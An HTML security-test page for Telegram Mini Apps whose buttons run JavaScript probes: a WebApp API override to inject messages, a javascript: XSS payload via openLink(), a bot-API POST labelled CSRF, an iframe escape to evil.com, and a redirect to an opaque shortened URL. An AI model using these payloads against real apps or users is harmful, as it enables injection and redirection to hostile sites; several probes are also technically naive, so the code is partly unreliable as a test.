<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App Security Test</title>
</head>
<body>
    <h1>Telegram Mini App Security Test</h1>
    <button onclick="exploitWebApp()">📩 Test Message Injection via WebApp Override</button>
    <button onclick="testOpenLink()">🖥️ Test XSS via openLink()</button>
    <button onclick="testCSRF()">⚠️ Test CSRF Attack</button>
    <button onclick="checkIframeBreakout()">🔓 Test Iframe Escape</button>
    <button onclick="testOpenRedirect()">🔗 Test Open Redirect with Shortened URL</button>

    <script>
        // 🚨 1. Listen for incoming messages from Telegram
        window.addEventListener("message", function(event) {
            console.log("📩 Received Message:", event.origin, event.data);

            // 🛑 Origin Spoofing Detection
            if (event.origin !== "https://web.telegram.org") {
                alert("⚠️ Possible origin bypass detected! Unexpected origin: " + event.origin);
            }

            // 🚨 Check for Sensitive Data Exposure
            if (typeof event.data === "string" && event.data.includes("token")) {
                alert("🔴 Potential Sensitive Data Exposure: " + event.data);
            }
        });

        // 🚀 2. Exploit WebApp Properties to Inject a Message
        function exploitWebApp() {
            console.log("📩 Attempting WebApp API override...");
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    window.Telegram.WebApp.sendData = function() {
                        return '{"event":"message","payload":{"chat_id":123456789,"text":"Injected Message via WebApp!"}}';
                    };
                    window.Telegram.WebApp.MainButton.setText("Exploit Triggered!").show();
                    alert("✅ WebApp Exploit Executed! Check chat for injected message.");
                } catch (e) {
                    console.error("❌ Exploit failed:", e);
                }
            } else {
                alert("⚠️ Telegram WebApp API not found.");
            }
        }

        // ⚡ 3. Test XSS via openLink()
        function testOpenLink() {
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.openLink("javascript:alert('XSS Detected!')");
            } else {
                alert("⚠️ Telegram WebApp API not found.");
            }
        }

        // 🎭 4. Test CSRF Attack
        function testCSRF() {
            let csrfPayload = {
                method: "sendMessage",
                chat_id: 123456789, // Change this to your Telegram User ID
                text: "CSRF Test Message!"
            };

            fetch("https://api.telegram.org/bot<TOKEN>/sendMessage", {
                method: "POST",
                body: JSON.stringify(csrfPayload),
                headers: { "Content-Type": "application/json" }
            }).then(response => response.json()).then(data => {
                console.log("CSRF Response:", data);
            }).catch(error => {
                console.error("CSRF Attack Failed:", error);
            });
        }

        // 🔓 5. Attempt Iframe Escape
        function checkIframeBreakout() {
            try {
                top.location = "https://evil.com";  // Should be blocked
                alert("⚠️ Iframe escape possible!");
            } catch (error) {
                alert("✅ Iframe escape is blocked (Safe).");
            }
        }

        // 🔗 6. Test Open Redirect with Shortened URL
        function testOpenRedirect() {
            const redirectUrl = "https://shorturl.at/B3Wwf";  // Shortened link
            window.location.href = redirectUrl;  // This will trigger the redirect
        }
    </script>
</body>
</html>
